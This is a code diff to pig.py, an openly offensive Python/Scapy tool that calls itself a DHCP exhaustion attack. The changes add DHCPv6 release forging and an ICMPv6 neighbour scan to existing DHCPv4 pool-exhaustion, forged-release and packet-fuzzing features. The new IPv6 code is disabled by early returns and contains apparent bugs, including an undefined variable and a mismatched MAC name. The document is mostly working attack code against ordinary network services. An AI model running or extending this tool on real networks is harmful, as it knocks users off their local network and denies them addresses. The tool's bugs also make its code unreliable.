@@ -4,7 +4,7 @@
 enhanced DHCP exhaustion attack plus.
 
 Usage:
-    pig.py [-h -6 -f -a -i -o -x -y -z -g -r -n -1 -c] <interface>
+    pig.py [-h -v -6 -1 -s -f -t -a -i -o -x -y -z -g -r -n -c] <interface>
   
 Options:
     -h, --help                     <-- you are here :)
@@ -16,7 +16,7 @@ Options:
     -6, --ipv6                     ... DHCPv6 (off, DHCPv4 by default)
     -1, --v6-rapid-commit          ... enable RapidCommit (2way ip assignment instead of 4way) (off)
     
-    -c, --client-macs              ... a list of client macs 00:11:22:33:44:55,00:11:22:33:44:56 (Default: <random>)
+    -s, --client-src               ... a list of client macs 00:11:22:33:44:55,00:11:22:33:44:56 (Default: <random>)
     
     -f, --fuzz                     ... randomly fuzz packets (off)
 
@@ -139,11 +139,11 @@ THREAD_POOL = []
 def checkArgs():
     global SHOW_ARP ,SHOW_ICMP, SHOW_DHCPOPTIONS, TIMEOUT, MODE_IPv6, MODE_FUZZ, DO_ARP, DO_GARP, DO_RELEASE, MAC_LIST, DO_COLOR,DO_v6_RC, VERBOSITY,THREAD_CNT
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "haiox:y:z:6fgrnm:c1v:t:", ["help","show-arp","show-icmp",
+        opts, args = getopt.getopt(sys.argv[1:], "haiox:y:z:6fgrns:c1v:t:", ["help","show-arp","show-icmp",
                                                                       "show-options","timeout-threads=","timeout-dos=",
                                                                       "timeout-dhcprequest=", "neighbors-scan-arp",
                                                                       "neighbors-attack-release", "neighbors-attack-garp",
-                                                                      "fuzz","ipv6","client-macs=","color","v6-rapid-commit",
+                                                                      "fuzz","ipv6","client-src=","color","v6-rapid-commit",
                                                                       "verbosity=","threads="])
     except getopt.GetoptError, err:
         # print help information and exit:
@@ -176,7 +176,7 @@ def checkArgs():
             DO_RELEASE=True
         elif o in ("-n", "--neighbors-scan-arp"):
             DO_ARP=True
-        elif o in ("-m", "--client-macs"):
+        elif o in ("-s", "--client-src"):
             MAC_LIST=a.strip().split(",")
         elif o in ("-c", "--color"):
             DO_COLOR=True
@@ -361,6 +361,15 @@ def v6_build_request(p_advertise,iaid=0xf,trid=None,options=[23,24]):
     dhcp_request=ethead/DHCP6_Request(trid=trid)/cli_id/srv_id/iana/DHCP6OptElapsedTime()/DHCP6OptOptReq( reqopts=[23,24])
     return dhcp_request
 
+def v6_build_release(p_advertise,mac,iaid=0xf,trid=None):
+    trid=trid or random.randint(0x00,0xffffff)
+    ethead=v6_build_ether(p_advertise[Ether].dst)
+    srv_id=DHCP6OptServerId(duid=p_advertise[DHCP6OptServerId].duid)
+    cli_id=DHCP6OptClientId(duid=DUID_LLT(lladdr=mac,timeval=int(time.time())))
+    iana=DHCP6OptIA_NA(ianaopts=p_advertise[DHCP6OptIA_NA].ianaopts, iaid=iaid)
+    dhcp_request=ethead/DHCP6_Release(trid=trid)/cli_id/srv_id/iana/DHCP6OptElapsedTime()
+    return dhcp_request
+
 def sendPacket(pkt):
     if MODE_FUZZ:
         # only fuzz: UDP with payload of UDP (DHCP messages)
@@ -375,8 +384,26 @@ def sendPacket(pkt):
 def neighbors():
     global dhcpsip,subnet,nodes
     nodes={}
-    if MODE_IPv6:
+    if MODE_IPv6 :
         LOG(type="WARNING", message= "IPv6 - neighbors() not supported at this point ")
+        # ICMPv6 neighbor solicitation - who has fxy
+        return
+        if not p_dhcp_advertise:
+            LOG(type="WARNING", message= "IPv6 - neighbors() - need at least one advertise to do a neighbor scan ")
+            return
+        m=randomMAC()
+        p = v6_build_ether(m)
+        del(p[UDP])                              # dont need UDP
+        # FIXME: use ipaddr to calc subnet
+        # 
+        net = p_dhcp_advertise[DHCP6OptServerId].duid.lladdr    # FIXME: make this fit the advertised net
+        
+        ns = ICMPv6ND_NS(tgt=net, R=0)/ICMPv6NDOptSrcLLAddr(lladdr=m)
+        ans,unans = srp(p/ns/ls, timeout=8, filter="icmp6")         #tune filter to only show neighbor solictaiations
+        for request,reply in ans:
+            nodes[reply.hwsrc]=reply.psrc
+            LOG(type="<--", message=  "%15s - %s " % (reply.psrc, reply.hwsrc) )
+        
     else:
         m=randomMAC()
         net=dhcpsip+"/"+calcCIDR(subnet)
@@ -390,9 +417,13 @@ def neighbors():
 # send release for our neighbors
 #
 def release():
-    global dhcpsmac,dhcpsip,nodes
-    if MODE_IPv6:
-        LOG(type="WARNING", message= " IPv6 - release() not supported at this point ")
+    global dhcpsmac,dhcpsip,nodes,p_dhcp_advertise
+    if MODE_IPv6 and p_dhcp_advertise and DHCP6OptServerId in p_dhcp_advertise:
+        LOG(type="WARNING", message= " IPv6 - release() is not supported and supposed to be experimental - feel free to add code! ")
+        return
+        # we are releaseing client IDs!
+        m=randomMAC()
+        v6_build_release(p_dhcp_advertise,mac)
     else:
         LOG(type="NOTICE", message= "***  Sending DHCPRELEASE for neighbors ")
         myxid=random.randint(1, 900000000)
@@ -479,11 +510,12 @@ class sniff_dhcp(threading.Thread):
             if not MODE_FUZZ and self.dhcpcount==5: dhcpdos=True
           
     def detect_dhcp(self,pkt):
-        global dhcpsmac,dhcpsip,subnet,SHOW_ARP,SHOW_DHCPOPTIONS,SHOW_ICMP,DO_v6_RC
+        global dhcpsmac,dhcpsip,subnet,SHOW_ARP,SHOW_DHCPOPTIONS,SHOW_ICMP,DO_v6_RC,p_dhcp_advertise
         if MODE_IPv6:
             if DHCP6_Advertise in pkt:
                 self.dhcpcount=0
                 if DHCP6OptIAAddress in pkt and DHCP6OptServerId in pkt:
+                    p_dhcp_advertise = pkt
                     myip=pkt[DHCP6OptIAAddress].addr
                     sip=repr(pkt[DHCP6OptServerId].duid.lladdr)
                     cip=repr(pkt[DHCP6OptClientId].duid.lladdr)
@@ -567,7 +599,7 @@ class sniff_dhcp(threading.Thread):
 # MAIN()
 #
 def main():
-    global THREAD_POOL,dhcpdos,dhcpsip,dhcpsmac,subnet,nodes,THREAD_CNT
+    global THREAD_POOL,dhcpdos,dhcpsip,dhcpsmac,subnet,nodes,THREAD_CNT,p_dhcp_advertise
     
     checkArgs()
     LOG(type="NOTICE", message= "[INFO] - using interface %s"%conf.iface)
@@ -577,6 +609,7 @@ def main():
     subnet=None
     nodes={}
     dhcpdos=False 
+    p_dhcp_advertise = None # contains dhcp advertise pkt once it is received (base for creating release())
 
     
     LOG(type="DEBUG",message="Thread %d - (Sniffer) READY"%len(THREAD_POOL))
@@ -599,11 +632,10 @@ def main():
     if fail_cnt==0:
         LOG(type="NOTICE", message= "[FAIL] No DHCP offers detected - aborting")
         return
-        
-    
+
     if DO_ARP: neighbors()
-    if DO_RELEASE: release()
-    
+    if DO_RELEASE: release()        
+       
     while not dhcpdos:
         time.sleep(TIMEOUT['dos'])
         LOG(type="?", message= " \t\twaiting for DHCP pool exhaustion...")
@@ -620,6 +652,3 @@ def usage():
 if __name__ == '__main__':
     main()
     print "\n"
-
-
-
